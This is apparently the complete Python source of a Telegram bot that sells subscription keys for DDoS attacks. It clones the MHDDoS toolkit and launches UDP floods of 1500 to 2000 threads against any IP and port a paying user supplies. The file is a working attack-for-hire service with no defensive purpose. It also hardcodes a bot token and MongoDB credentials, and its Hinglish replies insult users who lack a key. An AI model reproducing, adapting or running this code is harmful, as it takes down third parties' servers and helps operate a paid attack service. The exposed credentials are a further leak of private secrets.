import telebot
import subprocess
import threading
import time
import random
import os
from telebot import types
from datetime import datetime, timedelta
from pymongo import MongoClient

# --- CONFIG ---
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
# DNS Error bypass karne ke liye maine direct IP format set kiya hai
MONGO_URL = "mongodb://riderbhai:riderbhai321@cluster0-shard-00-00.yvrweuu.mongodb.net:27017,cluster0-shard-00-01.yvrweuu.mongodb.net:27017,cluster0-shard-00-02.yvrweuu.mongodb.net:27017/RiderBot?ssl=true&replicaSet=atlas-yvrweuu-shard-0&authSource=admin&retryWrites=true&w=majority"
ADMIN_ID = 6075779781 
bot = telebot.TeleBot(TOKEN)
# --- MONGODB CONNECTION ---
client = MongoClient(MONGO_URL)
db = client['RiderBot']
users_col = db['users']
keys_col = db['keys']

# --- ENGINE SETUP ---
if not os.path.exists("MHDDoS"):
    os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")

# --- PROGRESS BAR ---
def get_progress_bar(percent):
    bar_length = 10
    filled = int(percent / 10)
    return "🔥" * filled + "🌑" * (bar_length - filled)

# --- ATTACK LOGIC ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    threads = random.randint(1500, 2000)
    command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
    
    try:
        process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = int(duration - elapsed)
            percent = min(100, int((elapsed / duration) * 100))
            bar = get_progress_bar(percent)
            
            try:
                bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id,
                    text=(f"🚀 **VVIP ATTACK IN PROGRESS** 🚀\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"👤 **Attacker:** `@{username}`\n"
                          f"🎯 **Target:** `{ip}:{port}`\n"
                          f"⏳ **Remaining:** `{remaining}s` / `{duration}s`\n"
                          f"📊 **Power:** `{bar} {percent}%` \n"
                          f"🛡️ **System:** `BYPASSING CLOUD... ✅` \n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"⚠️ **Note:** Do not spam commands!"),
                    parse_mode="Markdown"
                )
            except: pass
            time.sleep(5)
        
        process.terminate()
        bot.send_message(chat_id, f"✅ **ATTACK FINISHED!**\nTarget `{ip}` was successfully hammered. 🔥")
    except: pass

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🚀 Start VVIP Attack', '👤 My Profile', '🔑 Redeem Key')
    return markup

# --- COMMANDS ---

@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    
    is_valid = (user_id == ADMIN_ID)
    if not is_valid and user_data:
        if datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now():
            is_valid = True

    if is_valid:
        bot.send_message(m.chat.id, f"💀 **Welcome back, Legend @{m.from_user.username}!**\nSystem is ready to crash servers.", reply_markup=main_menu())
    else:
        # Dhamki Message for No-Key users
        bot.send_message(m.chat.id, f"🚫 **ACCESS DENIED, CHUTIYE!** 🚫\n\nBeta, bina subscription ke bot touch karne ki himmat kaise hui? 😂\n\nAb chup-chap Admin @FLEXOP01 se key khareed le, warna yahi se block maar dunga! 🖕", parse_mode="Markdown")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        days = int(m.text.split()[1])
        key = f"RIDER-{random.randint(1000, 9999)}"
        keys_col.insert_one({"key": key, "days": days})
        # Direct Copy-Paste Format
        bot.send_message(m.chat.id, f"🔑 **VVIP KEY CREATED**\n\nClick to copy:\n`/redeem {key}`\n\n**Validity:** {days} Days")
    except: bot.reply_to(m, "Usage: `/genkey 1`")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = m.from_user.id
    parts = m.text.split()
    if len(parts) < 2:
        bot.reply_to(m, "❌ Key dalo bewakoof! Example: `/redeem RIDER-1234`")
        return
        
    key_text = parts[1]
    key_data = keys_col.find_one({"key": key_text})
    
    if key_data:
        days = key_data['days']
        expiry = datetime.now() + timedelta(days=days)
        users_col.update_one({"user_id": user_id}, {"$set": {"expiry": expiry.strftime('%Y-%m-%d %H:%M:%S')}}, upsert=True)
        keys_col.delete_one({"key": key_text})
        
        # Welcome & Guide for Friend
        bot.send_message(m.chat.id, f"🎉 **CONGRATS! ACCESS GRANTED!** 🎉\n\nAb tere paas **{days} din** ki power hai.\n\n📖 **KAISE ATTACK KAREIN?**\n1. Neeche '🚀 Start VVIP Attack' button dabao.\n2. Ye command likho: `/attack IP PORT TIME` \n3. Example: `/attack 1.2.3.4 8080 60` \n\nJao, tabahi machao! 🔥", reply_markup=main_menu())
    else:
        bot.reply_to(m, "❌ **GALAT KEY!** Dimag mat khao, asli key dalo.")

@bot.message_handler(func=lambda m: m.text == '🚀 Start VVIP Attack')
def guide(m):
    bot.reply_to(m, "🚀 **Command Format:**\n`/attack <IP> <PORT> <TIME>`\n\nExample: `/attack 1.1.1.1 80 120` \n(Max time: 300s)")

@bot.message_handler(func=lambda m: m.text == '👤 My Profile')
def profile(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    if user_id == ADMIN_ID: status = "OWNER 👑"
    elif user_data: status = f"Active ✅ (Until: {user_data['expiry']})"
    else: status = "No Access ❌"
    bot.send_message(m.chat.id, f"👤 **USER PROFILE**\n🆔 ID: `{user_id}`\n📊 Status: {status}")

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    
    is_auth = (user_id == ADMIN_ID)
    if not is_auth and user_data:
        if datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now():
            is_auth = True

    if not is_auth:
        bot.reply_to(m, "🖕 **KEY KAHAN HAI?** Pehle subscription le phir attack maar.")
        return

    try:
        p = m.text.split()
        if len(p) < 4:
            bot.reply_to(m, "❌ Format sahi daal: `/attack IP PORT TIME`")
            return
        
        sent = bot.reply_to(m, "📡 **CRACKING SERVER PROTECTION... ⚡**")
        threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
    except: pass

print("🚀 Dangerous Bot is Online!")
bot.infinity_polling()
    
